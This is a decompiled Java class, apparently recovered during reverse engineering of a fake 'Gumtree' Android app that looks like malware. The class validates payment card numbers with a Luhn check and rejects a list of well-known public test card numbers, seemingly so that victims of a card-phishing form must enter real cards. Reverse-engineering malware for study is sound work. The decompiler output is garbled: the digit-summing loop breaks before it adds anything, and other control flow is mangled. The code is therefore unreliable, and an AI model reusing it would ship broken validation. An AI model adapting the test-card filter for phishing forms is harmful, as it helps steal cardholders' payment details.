package com.gumsis.injs.g.val;

import com.gumsis.injs.g.val.models.Card;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Iterator;

public final class CVal
{
  private final String[] BLACK_LIST_CARDS = { "6011111111111117", "6011000990139424", "3530111333300000", "3566002020360505", "5105105105105100", "4111111111111111", "4012888888881881", "5019717010103742", "6331101999990016" };
  private String cardNumber;
  private int checkDigit;
  
  public CVal(String paramString)
  {
    this.cardNumber = paramString.replace(" ", "");
  }
  
  private int addAllNumber()
  {
    int i = 0;
    int j = 0;
    if (j < this.cardNumber.length())
    {
      if (this.cardNumber.length() % 2 != 0) {
        i += multiplyOddByTwo(j + 1, Integer.parseInt(String.valueOf(this.cardNumber.charAt(j))));
      }
      for (;;)
      {
        j += 1;
        break;
        i += multiplyOddByTwo(j, Integer.parseInt(String.valueOf(this.cardNumber.charAt(j))));
      }
    }
    return i;
  }
  
  private void dropLastNumber()
  {
    this.checkDigit = Integer.parseInt(this.cardNumber.substring(this.cardNumber.length() - 1));
    this.cardNumber = this.cardNumber.substring(0, this.cardNumber.length() - 1);
  }
  
  private ArrayList<Integer> fetchPossibleLength(CEnum paramCEnum)
  {
    Object localObject1 = new ArrayList(Arrays.asList(paramCEnum.getLength().split(",")));
    paramCEnum = new ArrayList();
    localObject1 = ((ArrayList)localObject1).iterator();
    while (((Iterator)localObject1).hasNext())
    {
      Object localObject2 = (String)((Iterator)localObject1).next();
      if (((String)localObject2).contains("-"))
      {
        localObject2 = ((String)localObject2).split("-");
        int i = Integer.parseInt(localObject2[0].trim());
        int j = Integer.parseInt(localObject2[1].trim());
        while (i <= j)
        {
          paramCEnum.add(Integer.valueOf(i));
          i += 1;
        }
      }
      else
      {
        paramCEnum.add(Integer.valueOf(Integer.parseInt(((String)localObject2).trim())));
      }
    }
    return paramCEnum;
  }
  
  private boolean isBlackCard(String paramString)
  {
    boolean bool2 = false;
    String[] arrayOfString = this.BLACK_LIST_CARDS;
    int j = arrayOfString.length;
    int i = 0;
    for (;;)
    {
      boolean bool1 = bool2;
      if (i < j)
      {
        if (paramString.equals(arrayOfString[i])) {
          bool1 = true;
        }
      }
      else {
        return bool1;
      }
      i += 1;
    }
  }
  
  private int multiplyOddByTwo(int paramInt1, int paramInt2)
  {
    if (paramInt1 % 2 == 0) {
      return paramInt2;
    }
    return subtractNine(paramInt2 * 2);
  }
  
  private int subtractNine(int paramInt)
  {
    int i = paramInt;
    if (paramInt > 9) {
      i = paramInt - 9;
    }
    return i;
  }
  
  public Card guessCard()
  {
    CEnum[] arrayOfCEnum = CEnum.values();
    int j = arrayOfCEnum.length;
    int i = 0;
    while (i < j)
    {
      CEnum localCEnum = arrayOfCEnum[i];
      Iterator localIterator = new ArrayList(Arrays.asList(localCEnum.getStartWith().split(","))).iterator();
      while (localIterator.hasNext())
      {
        Object localObject = ((String)localIterator.next()).trim();
        if (((String)localObject).contains("-"))
        {
          localObject = ((String)localObject).split("-");
          long l1 = Long.parseLong(localObject[0].trim());
          long l2 = Long.parseLong(localObject[1].trim());
          if (String.valueOf(l1).length() <= this.cardNumber.length())
          {
            localObject = this.cardNumber.substring(0, String.valueOf(l1).length());
            if ((Long.parseLong((String)localObject) >= l1) && (Long.parseLong((String)localObject) <= l2)) {
              return new Card(localCEnum.getCardName(), fetchPossibleLength(localCEnum), localCEnum.getIcon());
            }
          }
        }
        else if (this.cardNumber.startsWith((String)localObject))
        {
          return new Card(localCEnum.getCardName(), fetchPossibleLength(localCEnum), localCEnum.getIcon());
        }
      }
      i += 1;
    }
    return null;
  }
  
  public boolean isValidCardNumber()
  {
    if (this.cardNumber.trim().isEmpty()) {}
    do
    {
      do
      {
        return false;
      } while ((this.cardNumber.length() < 16) || (isBlackCard(this.cardNumber)));
      dropLastNumber();
    } while ((addAllNumber() + this.checkDigit) % 10 != 0);
    return true;
  }
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/injs/g/val/CVal.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */